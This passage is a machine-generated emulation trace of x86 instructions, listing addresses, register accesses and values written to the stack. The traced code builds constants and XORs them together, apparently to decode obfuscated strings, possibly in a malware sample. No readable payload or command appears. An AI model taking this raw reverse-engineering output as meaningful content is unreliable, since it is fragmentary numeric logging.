0x8524 for stack size 0x10000 saving data to stack: 2231344414 4 0x45c3a0: mov dword ptr [esp + 0x528], ecx, regs_read: [30, 22], regs_write: () adjusting stack for ESP -0x130 and offset 0x8528 for stack size 0x10000 saving data to stack: 586689126 4 0x45c3a7: mov dword ptr [esp + 0x44], eax, regs_read: [30, 19], regs_write: () adjusting stack for ESP -0x130 and offset 0x8044 for stack size 0x10000 saving data to stack: 2231344414 4 0x45c3af: mov dword ptr [esp + 0x52c], edx, regs_read: [30, 24], regs_write: () adjusting stack for ESP -0x130 and offset 0x852c for stack size 0x10000 saving data to stack: 1701587195 4 0x45c3b6: movaps xmmword ptr [esp + 0x30], xmm1, regs_read: [30, 123], regs_write: () adjusting stack for ESP -0x130 and offset 0x8030 for stack size 0x10000 saving data to stack: 126876114252850004720391376308047472994 16 0x45c3bb: mov dword ptr [esp + 0x48], ecx, regs_read: [30, 22], regs_write: () adjusting stack for ESP -0x130 and offset 0x8048 for stack size 0x10000 saving data to stack: 586689126 4 0x45c3bf: mov ecx, esi, regs_read: [29], regs_write: [22] 0x45c3c1: mov dword ptr [esp + 0x520], 0x7208cb09, regs_read: [30], regs_write: () adjusting stack for ESP -0x130 and offset 0x8520 for stack size 0x10000 saving data to stack: 1913178889 4 0x45c3cc: movaps xmm1, xmmword ptr [esp + 0x520], regs_read: [30], regs_write: [123] adjusting stack for ESP -0x130 and offset 0x8520 for stack size 0x10000 0x45c3d4: mov dword ptr [esp + 0x40], 0x7208af60, regs_read: [30], regs_write: () adjusting stack for ESP -0x130 and offset 0x8040 for stack size 0x10000 saving data to stack: 1913171808 4 0x45c3dc: mov dword ptr [esp + 0x4c], edx, regs_read: [30, 24], regs_write: () adjusting stack for ESP -0x130 and offset 0x804c for stack size 0x10000 saving data to stack: 1701587195 4 0x45c3e0: pxor xmm1, xmmword ptr [esp + 0x40], regs_read: [123, 30], regs_write: [123] adjusting stack for ESP -0x130 and offset 0x8040 for stack size 0x10000 0x45c3e6: push eax, regs_read: [30, 19], regs_write: [30] 0x45c3e7: movaps xmmword ptr [esp + 0x44], xmm1, regs_read: [30, 123], regs_write: () adjusting stack for ESP -0x134 and offset 0x8044 for stack size 0x10000 saving data to stack: 25705 16 0x45c3f8: push ecx, regs_read: [30, 22], regs_write: [30] 0x45c3f9: mov ecx, eax, regs_read: [19], regs_write: [22] 0x45c400: push dword ptr [esp + 0x194], regs_read: [30], regs_write: [30] 0x45c407: push dword ptr [esp + 0x194], regs_read: [30], regs_write: [30] 0x45c410: mov ecx, 0x35694ee8, regs_read: (), regs_write: [22] 0x45c415: mov dword ptr [esp + 0x390], 0x368692b7, regs_read: [30], regs_write: () adjusting stack for ESP -0x140 and offset 0x8390 for stack size 0x10000 saving data to stack: 914789047 4 0x45c420: mov eax, 0x3769ce54, regs_read: (), regs_write: [19] 0x45c425: mov dword ptr [esp + 0x394], ecx, regs_read: [30, 22], regs_write: () adjusting stack for ESP -0x140 and offset 0x8394 for stack size 0x10000 saving data to stack: 896093928 4 0x45c42c: mov dword ptr [esp + 0x398], eax, regs_read: [30, 19], regs_write: () adjusting stack for ESP -0x140 and offset 0x8398 for stack size 0x10000 saving data to stack: 929680980 4 0x45c433: mov dword ptr [esp + 0x39c], edi, regs_read: [30, 23], regs_write: () adjusting stack for ESP -0x140 and offset 0x839c for stack size 0x10000 saving data to stack: 1389027477 4 0x45c43a: movaps xmm1, xmmword ptr [esp + 0x390], regs_read: [30], regs_write: [123] adjusting stack for ESP -0x140 and offset 0x8390 for stack size 0x10000 0x45c442: mov dword ptr [esp + 0x84], ecx, regs_read: [30, 22], regs_write: () adjusting stack for ESP -0x140 and offset 0x8084 for stack size 0x10000 saving data to stack: 896093928 4 0x45c450: mov dword ptr [esp + 0x80], 0x3686929a, regs_read: [30], regs_write: () adjusting stack for ESP -0x140 and offset 0x8080 for stack size 0x10000 saving data to stack: 914789018 4 0x45c45e: mov dword ptr [esp + 0x88], eax, regs_read: [30, 19], regs_write: () adjusting stack for ESP -0x140 and offset 0x8088 for stack size 0x10000 saving data to stack: 929680980 4 0x45c465: mov dword ptr [esp + 0x8c], edi, regs_read: [30, 23], regs_write: () adjusting stack for ESP -0x140 and offset 0x808c for stack size 0x10000 saving data to stack: 1389027477 4 0x45c46c: pxor xmm1, xmmword ptr [esp + 0x80], regs_read: [123, 30], regs_write: [123] adjusting stack for ESP -0x140 and offset 0x8080 for stack size 0x10000 0x45c475: movaps xmmword ptr [esp + 0x80], xmm1, regs_read: [30, 123], regs_write: () adjusting stack for ESP -0x140 and offset 0x8080 for stack size 0x10000 saving data to stack: 45 16 0x45c47d: mov al, byte ptr [ecx], regs_read: [22], regs_write: [2] 0x45c48d: push ecx, regs_read: [30, 22], regs_write: [30] 0x45c48e: push eax, regs_read: [30, 19], regs_write: [30] 0x45c49b: mov dword ptr [esp + 0x110], 0x69f6ead2, regs_read: [30], regs_write: () adjusting stack for ESP -0x148 and offset 0x8110 for stack size 0x10000 saving data to stack: 1777789650 4 0x45c4ad: mov dword ptr [esp + 0x114], 0x41072185, regs_read: [30], regs_write: () adjusting stack for ESP -0x148 and offset 0x8114 for stack size 0x10000 saving data to stack: 1090986373 4 0x45c4b8: mov ecx, esi, regs_read: [29], regs_write: [22] 0x45c4ba: mov dword ptr [esp + 0x118], 0x3769ce3c, regs_read: [30], regs_write: () adjusting stack for ESP -0x148 and offset 0x8118 for stack size 0x10000 saving data to stack: 929680956 4 0x45c4c5: mov dword ptr [esp + 0x11c], edi, regs_read: [30, 23], regs_write: () adjusting stack for ESP -0x148 and offset 0x811c for stack size 0x10000 saving data to stack: 1389027477 4 0x45c4cc: movaps xmm0, xmmword ptr [esp + 0x110], regs_read: [30], regs_write: [122] adjusting stack for ESP -0x148 and offset 0x8110 for stack size 0x10000 0x45c4d4: pxor xmm0, xmmword ptr [esp + 0x3a0], regs_read: [122, 30], regs_write: [122] adjusting stack for ESP -0x148 and offset 0x83a0 for stack size 0x10000 0x45c4dd: push eax, regs_read: [30, 19], regs_write: [30] 0x45c4de: movaps xmmword ptr [esp + 0x114], xmm0, regs_read: [30, 122], regs_write: () adjusting stack for ESP -0x14c and offset 0x8114 for stack size 0x10000 saving data to stack: 1919888392598790808710 16 0x45c4f4: mov dword ptr [esp + 0x120], 0x69f6ead2, regs_read: [30], regs_write: () adjusting stack for ESP -0x14c and offset 0x8120 for stack size 0x10000 saving data to stack: 1777789650 4 0x45c506: mov dword ptr [esp + 0x124], 0x41072185, regs_read: [30], regs_write: () adjusting stack for ESP -0x14c and offset 0x8124 for stack size 0x10000 saving data to stack: 1090986373 4 0x45c511: mov ecx, esi, regs_read: [29], regs_write: [22] 0x45c513: mov dword ptr [esp + 0x128], 0x3769ce3c, regs_read: [30], regs_write: () adjusting stack for ESP -0x14c and offset 0x8128 for stack size 0x10000 saving data to stack: 929680956 4 0x45c51e: mov dword ptr [esp + 0x12c], edi, regs_read: [30, 23], regs_write: () adjusting stack for ESP -0x14c and offset 0x812c for stack size 0x10000 saving data to stack: 1389027477 4 0x45c525: movaps xmm1, xmmword ptr [esp + 0x120], regs_read: [30], regs_write: [123] adjusting stack for ESP -0x14c and offset 0x8120 for stack size 0x10000 0x45c52d: mov dword ptr [esp + 0x3b0], 0x368692b7, regs_read: [30], regs_write: () adjusting stack for ESP -0x14c and offset 0x83b0 for stack size 0x10000 saving data to stack: 914789047 4 0x45c538: mov dword ptr [esp + 0x3b4], 0x35694ee8, regs_read: [30], regs_write: () adjusting stack for ESP -0x14c and offset 0x83b4 for stack size 0x10000 saving data to stack: 896093928 4 0x45c543: mov dword ptr [esp + 0x3b8], 0x3769ce54, regs_read: [30], regs_write: () adjusting stack for ESP -0x14c and offset 0x83b8 for stack size 0x10000 saving data to stack: 929680980 4 0x45c54e: mov dword ptr [esp + 0x3bc], edi, regs_read: [30, 23], regs_write: () adjusting stack for ESP -0x14c and offset 0x83bc for stack size 0x10000 saving data to stack: 1389027477 4 0x45c555: pxor xmm1, xmmword ptr [esp + 0x3b0], regs_read: [123, 30], regs_write: [123] adjusting stack for ESP -0x14c and offset 0x83b0 for stack size 0x10000 0x45c55e: push eax, regs_read: [30, 19], regs_write: [30] 0x45c55f: movaps xmmword ptr [esp + 0x124], xmm1, regs_read: [30, 123], regs_write: () adjusting stack for ESP -0x150 and offset 0x8124 for stack size 0x10000 saving data to stack: 1926851149337174505573 16 0x45c573: push ecx, regs_read: [30, 22], regs_write: [30] 0x45c574: mov ecx, eax, regs_read: [19], regs_write: [22] 0x45c57b: push dword ptr [esp + 0x1a4], regs_read: [30], regs_write: [30] 0x45c589: push dword ptr [esp + 0x1a4], regs_read: [30], regs_write: [30] 0x45c595: movaps xmm1, xmmword ptr [esp + 0x3c0], regs_read: [30], regs_write: [123] adjusting stack for ESP -0x15c and offset 0x83c0 for stack size 0x10000 0x45c5a4: mov dword ptr [esp + 0x130], 0x69f6ead2, regs_read: [30], regs_write: () adjusting stack for ESP -0x15c and offset 0x8130 for stack size 0x10000 saving data to stack: 1777789650 4 0x45c5af: mov ecx, esi, regs_read: [29], regs_write: [22] 0x45c5b1: mov dword ptr [esp + 0x134], 0x47082b91, regs_read: [30], regs_write: () adjusting stack for ESP -0x15c and offset 0x8134 for stack size 0x10000 saving data to stack: 1191717777 4 0x45c5bc: mov dword ptr [esp + 0x138], 0x3769ce54, regs_read: [30], regs_write: () adjusting stack for ESP -0x15c and offset 0x8138 for stack size 0x10000 saving data to stack: 929680980 4 0x45c5c7: mov dword ptr [esp + 0x13c], edi, regs_read: [30, 23], regs_write: () adjusting stack for ESP -0x15c and offset 0x813c for stack size 0x10000 saving data to stack: 1389027477 4 0x45c5ce: pxor xmm1, xmmword ptr [esp + 0x130], regs_read: [123, 30], regs_write: [123] adjusting stack for ESP -0x15c and offset 0x8130 for stack size 0x10000 0x45c5d7: push eax, regs_read: [30, 19], regs_write: [30] 0x45c5d8: movaps xmmword ptr [esp + 0x134], xmm1, regs_read: [30, 123], regs_write: () adjusting stack for ESP -0x160 and offset 0x8134 for stack size 0x10000 saving data to stack: 8241980365031372901 16 0x45c5ee: mov eax, 0x3769ce54, regs_read: (), regs_write: [19] 0x45c5f3: mov dword ptr [esp + 0x3d0], 0x368692b7, regs_read: [30], regs_write: () adjusting stack for ESP -0x160 and offset 0x83d0 for stack size 0x10000 saving data to stack: 914789047 4 0x45c5fe: mov dword ptr [esp + 0x3d8], eax, regs_read: [30, 19], regs_write: () adjusting stack for ESP -0x160 and offset 0x83d8 for stack size 0x10000 saving data to stack: 929680980 4 0x45c605: mov ecx, esi, regs_read: [29], regs_write: [22] 0x45c607: mov dword ptr [esp + 0x148], eax, regs_read: [30, 19], regs_write: () adjusting stack for ESP -0x160 and offset 0x8148 for stack size 0x10000 saving data to stack: 929680980 4 0x45c615: mov dword ptr [esp + 0x3d4], 0x35694ee8, regs_read: [30], regs_write: () adjusting stack for ESP -0x160 and offset 0x83d4 for stack size 0x10000 saving data to stack: 896093928 4 0x45c620: mov dword ptr [esp + 0x3dc], edi, regs_read: [30, 23], regs_write: () adjusting stack for ESP -0x160 and offset 0x83dc for stack size 0x10000 saving data to stack: 1389027477 4 0x45c627: movaps xmm1, xmmword ptr [esp + 0x3d0], regs_read: [30], regs_write: [123] adjusting stack for ESP -0x160 and offset 0x83d0 for stack size 0x10000 0x45c62f: mov dword ptr [esp + 0x140], 0x69f6ead2, regs_read: [30], regs_write: () adjusting stack for ESP -0x160 and offset 0x8140 for stack size 0x10000 saving data to stack: 1777789650 4 0x45c63a: mov dword ptr [esp + 0x144], 0x47082b91, regs_read: [30], regs_write: () adjusting stack for ESP -0x160 and offset 0x8144 for stack size 0x10000 saving data to stack: 1191717777 4 0x45c645: mov dword ptr [esp + 0x14c], edi, regs_read: [30, 23], regs_write: () adjusting stack for ESP -0x160 and offset 0x814c for stack size 0x10000 saving data to stack: 1389027477 4 0x45c64c: pxor xmm1, xmmword ptr [esp + 0x140], regs_read: [123, 30], regs_write: [123] adjusting stack for ESP -0x160 and offset 0x8140 for stack size 0x10000 0x45c655: push eax, regs_read: [30, 19], regs_write: [30] 0x45c656: movaps xmmword ptr [esp + 0x144], xmm1, regs_read: [30, 123], regs_write: () adjusting stack for ESP -0x164 and offset 0x8144 for stack size 0x10000 saving data to stack: 8241980365031372901 16 0x45c66a: push ecx, regs_read: [30, 22], regs_write: [30] 0x45c66b: mov ecx, eax, regs_read: [19], regs_write: [22] 0x45c672: push dword ptr [esp + 0x1b4], regs_read: [30], regs_write: [30] 0x45c680: push dword ptr [esp + 0x1b4], regs_read: [30], regs_write: [30] 0x45c68c: movaps xmm1, xmmword ptr [esp + 0x530], regs_read: [30], regs_write: [123] adjusting stack for ESP -0x170 and offset 0x8530 for stack size 0x10000 0x45c698: mov dword ptr [esp + 0x30], 0x5ff6ead2, regs_read: [30], regs_write: () adjusting stack for ESP -0x170 and offset 0x8030 for stack size 0x10000 saving data to stack: 1610017490 4 0x45c6a0: mov ecx, esi, regs_read: [29], regs_write: [22] 0x45c6a2: mov dword ptr [esp + 0x34], 0x5c1d2f9a, regs_read: [30], regs_write: () adjusting stack for ESP -0x170 and offset 0x8034 for stack size 0x10000 saving data to stack: 1545416602 4 0x45c6aa: mov dword ptr [esp + 0x38], 0x5a36a03b, regs_read: [30], regs_write: () adjusting stack for ESP -0x170 and offset 0x8038 for stack size 0x10000 saving data to stack: 1513529403 4 0x45c6b2: mov dword ptr [esp + 0x3c], 0x3abe8efa, regs_read: [30], regs_write: () adjusting stack for ESP -0x170 and offset 0x803c for stack size 0x10000 saving data to stack: 985566970 4 0x45c6ba: pxor xmm1, xmmword ptr [esp + 0x30], regs_read: [123, 30], regs_write: [123] adjusting stack for ESP -0x170 and offset 0x8030 for stack size 0x10000 0x45c6c0: movaps xmmword ptr [esp + 0x30], xmm1, regs_read: [30, 123], regs_write: () adjusting stack for ESP -0x170 and offset 0x8030 for stack size 0x10000 saving data to stack: 0 16 0x45c6c5: movaps xmm1, xmmword ptr [esp + 0x540], regs_read: [30], regs_write: [123] adjusting stack for ESP -0x170 and offset 0x8540 for stack size 0x10000 0x45c6cd: mov dword ptr [esp + 0x40], 0x7208cb09, regs_read: [30], regs_write: () adjusting stack for ESP -0x170 and offset 0x8040 for stack size 0x10000 saving data to stack: 1913178889 4 0x45c6d5: mov dword ptr [esp + 0x44], 0x84ff9d1e, regs_read: [30], regs_write: () adjusting stack for ESP -0x170 and offset 0x8044 for stack size 0x10000 saving data to stack: 2231344414 4 0x45c6dd: mov dword ptr [esp + 0x48], 0x22f82a66, regs_read: [30], regs_write: () adjusting stack for ESP -0x170 and offset 0x8048 for stack size 0x10000 saving data to stack: 586689126 4 0x45c6e5: mov dword ptr [esp + 0x4c], 0x656c28fb, regs_read: [30], regs_write: () adjusting stack for ESP -0x170 and offset 0x804c for stack size 0x10000 saving data to stack: 1701587195 4 0x45c6ed: pxor xmm1, xmmword ptr [esp + 0x40], regs_read: [123, 30], regs_write: [123] adjusting stack for ESP -0x170 and offset 0x8040 for stack size 0x10000 0x45c6f3: push eax, regs_read: [30, 19], regs_write: [30] 0x45c6f4: movaps xmmword ptr [esp + 0x44], xmm1, regs_read: [30, 123], regs_write: () adjusting stack for ESP -0x174 and offset 0x8044 for stack size 0x10000 saving data to stack: 109027335965086979935392748836271737609 16 0x45c707: mov dword ptr [esp + 0x550], 0x368692b7, regs_read: [30], regs_write: () adjusting stack for ESP -0x174 and offset 0x8550 for stack size 0x10000 saving data to stack: 914789047 4 0x45c712: mov eax, 0x84ff9d1e, regs_read: (), regs_write: [19] 0x45c717: mov dword ptr [esp + 0x554], 0x35694ee8, regs_read: [30], regs_write: () adjusting stack for ESP -0x174 and offset 0x8554 for stack size 0x10000 saving data to stack: 896093928 4 0x45c722: mov ecx, 0x22f82a66, regs_read: (), regs_write: [22] 0x45c727: mov dword ptr [esp + 0x558], 0x3769ce54, regs_read: [30], regs_write: () adjusting stack for ESP -0x174 and offset 0x8558 for stack size 0x10000 saving data to stack: 929680980 4 0x45c732: mov edx, 0x656c28fb, regs_read: (), regs_write: [24] 0x45c737: mov dword ptr [esp + 0x55c], edi, regs_read: [30, 23], regs_write: () adjusting stack for ESP -0x174 and offset 0x855c for stack size 0x10000 saving data to stack: 1389027477 4 0x45c73e: movaps xmm1, xmmword ptr [esp + 0x550], regs_read: [30], regs_write: [123] adjusting stack for ESP -0x174 and offset 0x8550 for stack size 0x10000 0x45c746: mov dword ptr [esp + 0x30], 0x5ff6ead2, regs_read: [30], regs_write: () adjusting stack for ESP -0x174 and offset 0x8030 for stack size 0x10000 saving data to stack: 1610017490 4 0x45c74e: mov dword ptr [esp + 0x34], 0x5c1d2f9a, regs_read: [30], regs_write: () adjusting stack for ESP -0x174 and offset 0x8034 for stack size 0x10000 saving data to stack: 1545416602 4 0x45c756: mov dword ptr [esp + 0x38], 0x5a36a03b, regs_read: [30], regs_write: () adjusting stack for ESP -0x174 and offset 0x8038 for stack size 0x10000 saving data to stack: 1513529403 4 0x45c75e: mov dword ptr [esp + 0x3c], 0x3abe8efa, regs_read: [30], regs_write: () adjusting stack for ESP -0x174 and offset 0x803c for stack size 0x10000 saving data to stack: 985566970 4 0x45c766: pxor xmm1, xmmword ptr [esp + 0x30], regs_read: [123, 30], regs_write: [123] adjusting stack for ESP -0x174 and offset 0x8030 for stack size 0x10000 0x45c76c: mov dword ptr [esp + 0x564], eax, regs_read: [30, 19], regs_write: () adjusting stack for ESP -0x174 and offset 0x8564 for stack size 0x10000 saving data to stack: 2231344414 4 0x45c773: mov dword ptr [esp + 0x568], ecx, regs_read: [30, 22], regs_write: () adjusting stack for ESP -0x174 and offset 0x8568 for stack size 0x10000 saving data to stack: 586689126 4 0x45c77a: mov dword ptr [esp + 0x44], eax, regs_read: [30, 19], regs_write: () adjusting stack for ESP -0x174 and offset 0x8044 for stack size 0x10000 saving data to stack: 2231344414 4 0x45c782: mov dword ptr [esp + 0x56c], edx, regs_read: [30, 24], regs_write: () adjusting stack for ESP -0x174 and offset 0x856c for stack size 0x10000 saving data to stack: 1701587195 4 0x45c789: movaps xmmword ptr [esp + 0x30], xmm1, regs_read: [30, 123], regs_write: () adjusting stack for ESP -0x174 and offset 0x8030 for stack size 0x10000 saving data to stack: 138844257890452967092884094645001287781 16 0x45c78e: mov dword ptr [esp + 0x48], ecx, regs_read: [30, 22], regs_write: () adjusting stack for ESP -0x174 and offset 0x8048 for stack size 0x10000 saving data to stack: 586689126 4 0x45c792: mov ecx, esi, regs_read: [29], regs_write: [22] 0x45c794: mov dword ptr [esp + 0x560], 0x7208cb09, regs_read: [30], regs_write: () adjusting stack for ESP -0x174 and offset 0x8560 for stack size 0x10000 saving data to stack: 1913178889 4 0x45c79f: movaps xmm1, xmmword ptr [esp + 0x560], regs_read: [30], regs_write: [123] adjusting stack for ESP -0x174 and offset 0x8560 for stack size 0x10000 0x45c7a7: mov dword ptr [esp + 0x40], 0x7208cb09, regs_read: [30], regs_write: () adjusting stack for ESP -0x174 and offset 0x8040 for stack size 0x10000 saving data to stack: 1913178889 4 0x45c7af: mov dword ptr [esp + 0x4c], edx, regs_read: [30, 24], regs_write: () adjusting stack for ESP -0x174 and offset 0x804c for stack size 0x10000 saving data to stack: 1701587195 4 0x45c7b3: pxor xmm1, xmmword ptr [esp + 0x40], regs_read: [123, 30], regs_write: [123] adjusting stack for ESP -0x174 and offset 0x8040 for stack size 0x10000 0x45c7b9: push eax, regs_read: [30, 19], regs_write: [30] 0x45c7ba: movaps xmmword ptr [esp + 0x44], xmm1, regs_read: [30, 123], regs_write: () adjusting stack for ESP -0x178 and offset 0x8044 for stack size 0x10000 saving data to stack: 0 16 0x45c7cb: push ecx, regs_read: [30, 22], regs_write: [30] 0x45c7cc: mov ecx, eax, regs_read: [19], regs_write: [22] 0x45c7d3: push dword ptr [esp + 0x1c4], regs_read: [30], regs_write: [30] 0x45c7e1: push dword ptr [esp + 0x1c4], regs_read: [30], regs_write: [30] 0x45c7ed: movaps xmm1, xmmword ptr [esp + 0x3e0], regs_read: [30], regs_write: [123] adjusting stack for ESP -0x184 and offset 0x83e0 for stack size 0x10000 0x45c7fc: mov dword ptr [esp + 0xb0], 0x5ff6ead2, regs_read: [30], regs_write: () adjusting stack for ESP -0x184 and offset 0x80b0 for stack size 0x10000 saving data to stack: 1610017490 4 0x45c807: mov ecx, esi, regs_read: [29], regs_write: [22] 0x45c809: mov dword ptr [esp + 0xb4], 0x5c1d2f9a, regs_read: [30], regs_write: () adjusting stack for ESP -0x184 and offset 0x80b4 for stack size 0x10000 saving data to stack: 1545416602 4 0x45c814: mov dword ptr [esp + 0xb8], 0x4e36a03b, regs_read: [30], regs_write: () adjusting stack for ESP -0x184 and offset 0x80b8 for stack size 0x10000 saving data to stack: 1312202811 4 0x45c81f: mov dword ptr [esp + 0xbc], 0x52b881f0, regs_read: [30], regs_write: () adjusting stack for ESP -0x184 and offset 0x80bc for stack size 0x10000 saving data to stack: 1387823600 4 0x45c82a: pxor xmm1, xmmword ptr [esp + 0xb0], regs_read: [123, 30], regs_write: [123] adjusting stack for ESP -0x184 and offset 0x80b0 for stack size 0x10000 0x45c833: push eax, regs_read: [30, 19], regs_write: [30] 0x45c834: movaps xmmword ptr [esp + 0xb4], xmm1, regs_read: [30, 123], regs_write: () adjusting stack for ESP -0x188 and offset 0x80b4 for stack size 0x10000 saving data to stack: 137999874006895180953001818985531705927 16 0x45c84a: mov dword ptr [esp + 0x3f0], 0x368692b7, regs_read: [30], regs_write: () adjusting stack for ESP -0x188 and offset 0x83f0 for stack size 0x10000 saving data to stack: 914789047 4 0x45c859: mov dword ptr [esp + 0x3f4], 0x35694ee8, regs_read: [30], regs_write: () adjusting stack for ESP -0x188 and offset 0x83f4 for stack size 0x10000 saving data to stack: 896093928 4 0x45c864: mov ecx, esi, regs_read: [29], regs_write: [22] 0x45c866: mov dword ptr [esp + 0x3f8], 0x3769ce54, regs_read: [30], regs_write: () adjusting stack for ESP -0x188 and offset 0x83f8 for stack size 0x10000 saving data to stack: 929680980 4 0x45c871: mov dword ptr [esp + 0x3fc], edi, regs_read: [30, 23], regs_write: () adjusting stack for ESP -0x188 and offset 0x83fc for stack size 0x10000 saving data to stack: 1389027477 4 0x45c878: movaps xmm1, xmmword ptr [esp + 0x3f0], regs_read: [30], regs_write: [123] adjusting stack for ESP -0x188 and offset 0x83f0 for stack size 0x10000 0x45c880: mov dword ptr [esp + 0x60], 0x5ff6ead2, regs_read: [30], regs_write: () adjusting stack for ESP -0x188 and offset 0x8060 for stack size 0x10000 saving data to stack: 1610017490 4 0x45c888: mov dword ptr [esp + 0x64], 0x5c1d2f9a, regs_read: [30], regs_write: () adjusting stack for ESP -0x188 and offset 0x8064 for stack size 0x10000 saving data to stack: 1545416602 4 0x45c890: mov dword ptr [esp + 0x68], 0x4e36a03b, regs_read: [30], regs_write: () adjusting stack for ESP -0x188 and offset 0x8068 for stack size 0x10000 saving data to stack: 1312202811 4 0x45c898: mov dword ptr [esp + 0x6c], 0x52b881f0, regs_read: [30], regs_write: () adjusting stack for ESP -0x188 and offset 0x806c for stack size 0x10000 saving data to stack: 1387823600 4 0x45c8a0: pxor xmm1, xmmword ptr [esp + 0x60], regs_read: [123, 30], regs_write: [123] adjusting stack for ESP -0x188 and offset 0x8060 for stack size 0x10000 0x45c8a6: push eax, regs_read: [30, 19], regs_write: [30] 0x45c8a7: movaps xmmword ptr [esp + 0x64], xmm1, regs_read: [30, 123], regs_write: () adjusting stack for ESP -0x18c and offset 0x8064 for stack size 0x10000 saving data to stack: 593897275211994159128352958178162789 16 0x45c8b8: push ecx, regs_read: [30, 22], regs_write: [30] 0x45c8b9: mov ecx, eax, regs_read: [19], regs_write: [22] 0x45c8c0: push dword ptr [esp + 0x1d4], regs_read: [30], regs_write: [30] 0x45c8ce: push dword ptr [esp + 0x1d4], regs_read: [30], regs_write: [30] 0x45c8e4: mov ecx, 0x35694ee8, regs_read: (), regs_write: [22] 0x45c8e9: mov dword ptr [esp + 0x400], 0x368692b7, regs_read: [30], regs_write: () adjusting stack for ESP -0x198 and offset 0x8400 for stack size 0x10000 saving data to stack: 914789047 4 0x45c8f4: mov eax, 0x3769ce54, regs_read: (), regs_write: [19] 0x45c8f9: mov dword ptr [esp + 0x404], ecx, regs_read: [30, 22], regs_write: () adjusting stack for ESP -0x198 and offset 0x8404 for stack size 0x10000 saving data to stack: 896093928 4 0x45c900: mov dword ptr [esp + 0x408], eax, regs_read: [30, 19], regs_write: () adjusting stack for ESP -0x198 and offset 0x8408 for stack size 0x10000 saving data to stack: 929680980 4 0x45c907: mov dword ptr [esp + 0x40c], edi, regs_read: [30, 23], regs_write: () adjusting stack for ESP -0x198 and offset 0x840c for stack size 0x10000 saving data to stack: 1389027477 4 0x45c90e: movaps xmm1, xmmword ptr [esp + 0x400], regs_read: [30], regs_write: [123] adjusting stack for ESP -0x198 and offset 0x8400 for stack size 0x10000 0x45c916: mov dword ptr [esp + 0x24], ecx, regs_read: [30, 22], regs_write: () adjusting stack for ESP -0x198 and offset 0x8024 for stack size 0x10000 saving data to stack: 896093928 4 0x45c91e: mov dword ptr [esp + 0x20], 0x3686929a, regs_read: [30], regs_write: () adjusting stack for ESP -0x198 and offset 0x8020 for stack size 0x10000 saving data to stack: 914789018 4 0x45c929: mov dword ptr [esp + 0x28], eax, regs_read: [30, 19], regs_write: () adjusting stack for ESP -0x198 and offset 0x8028 for stack size 0x10000 saving data to stack: 929680980 4 0x45c92d: mov dword ptr [esp + 0x2c], edi, regs_read: [30, 23], regs_write: () adjusting stack for ESP -0x198 and offset 0x802c for stack size 0x10000 saving data to stack: 1389027477 4 0x45c931: pxor xmm1, xmmword ptr [esp + 0x20], regs_read: [123, 30], regs_write: [123] adjusting stack for ESP -0x198 and offset 0x8020 for stack size 0x10000 0x45c937: movaps xmmword ptr [esp + 0x20], xmm1, regs_read: [30, 123], regs_write: () adjusting stack for ESP -0x198 and offset 0x8020 for stack size 0x10000 saving data to stack: 45 16 0x45c93c: mov al, byte ptr [ecx], regs_read: [22], regs_write: [2] 0x45c949: push ecx, regs_read: [30, 22], regs_write: [30] 0x45c94a: push eax, regs_read: [30, 19], regs_write: [30] 0x45c966: mov dword ptr [esp + 0x2b0], 0x53ebf3f9, regs_read: [30], regs_write: () adjusting stack for ESP -0x1a0 and offset 0x82b0 for stack size 0x10000 saving data to stack: 1407972345 4 0x45c987: mov dword ptr [esp + 0x2b4], 0x464c6ed2, regs_read: [30], regs_write: () adjusting stack for ESP -0x1a0 and offset 0x82b4 for stack size 0x10000 saving data to stack: 1179414226 4 0x45c999: mov dword ptr [esp + 0x2b8], 0x5e27c459, regs_read: [30], regs_write: () adjusting stack for ESP -0x1a0 and offset 0x82b8 for stack size 0x10000 saving data to stack: 1579664473 4 0x45c9ab: mov dword ptr [esp + 0x2bc], 0x33a48bf6, regs_read: [30], regs_write: () adjusting stack for ESP -0x1a0 and offset 0x82bc for stack size 0x10000 saving data to stack: 866421750 4 0x45c9b6: mov dword ptr [esp + 0x2c0], 0x5232ae64, regs_read: [30], regs_write: () adjusting stack for ESP -0x1a0 and offset 0x82c0 for stack size 0x10000 saving data to stack: 1379053156 4 0x45c9c1: mov dword ptr [esp + 0x2c4], 0x8ef2ee3b, regs_read: [30], regs_write: () adjusting stack for ESP -0x1a0 and offset 0x82c4 for stack size 0x10000 saving data to stack: 2398285371 4 0x45c9cc: mov dword ptr [esp + 0x2c8], 0x5696452b, regs_read: [30], regs_write: () adjusting stack for ESP -0x1a0 and offset 0x82c8 for stack size 0x10000 saving data to stack: 1452688683 4 0x45c9d7: mov dword ptr [esp + 0x2cc], 0x404c1293, regs_read: [30], regs_write: () adjusting stack for ESP -0x1a0 and offset 0x82cc for stack size 0x10000 saving data to stack: 1078727315 4 0x45c9e2: mov dword ptr [esp + 0x2d0], 0x7ae17028, regs_read: [30], regs_write: () adjusting stack for ESP -0x1a0 and offset 0x82d0 for stack size 0x10000 saving data to stack: 2061594664 4 0x45c9ed: mov dword ptr [esp + 0x2d4], 0x48821341, regs_read: [30], regs_write: () adjusting stack for ESP -0x1a0 and offset 0x82d4 for stack size 0x10000 saving data to stack: 1216484161 4 0x45c9f8: mov dword ptr [esp + 0x2d8], 0x867aeaa8, regs_read: [30], regs_write: () adjusting stack for ESP -0x1a0 and offset 0x82d8 for stack size 0x10000 saving data to stack: 2256202408 4 0x45ca03: mov dword ptr [esp + 0x2dc], 0x5bf702eb, regs_read: [30], regs_write: () adjusting stack for ESP -0x1a0 and offset 0x82dc for stack size 0x10000 saving data to stack: 1542914795 4 0x45ca0e: mov dword ptr [esp + 0x2e0], 0x6c7c85b9, regs_read: [30], regs_write: () adjusting stack for ESP -0x1a0 and offset 0x82e0 for stack size 0x10000 saving data to stack: 1820100025 4 0x45ca19: mov dword ptr [esp + 0x2e4], 0xe1c44ba9, regs_read: [30], regs_write: () adjusting stack for ESP -0x1a0 and offset 0x82e4 for stack size 0x10000 saving data to stack: 3787738025 4 0x45ca24: mov dword ptr [esp + 0x2e8], 0xbe82d36e, regs_read: [30], regs_write: () adjusting stack for ESP -0x1a0 and offset 0x82e8 for stack size 0x10000 saving data to stack: 3196244846 4 0x45ca2f: mov dword ptr [esp + 0x2ec], 0xdacf83e4, regs_read: [30], regs_write: () adjusting stack for ESP -0x1a0 and offset 0x82ec for stack size 0x10000 saving data to stack: 3671032804 4 0x45ca3a: mov dword ptr [esp + 0x2f0], 0xed90c83a, regs_read: [30], regs_write: () adjusting stack for ESP -0x1a0 and offset 0x82f0 for stack size 0x10000 saving data to stack: 3985688634 4 0x45ca45: mov dword ptr [esp + 0x2f4], 0xb013d6d, regs_read: [30], regs_write: () adjusting stack for ESP 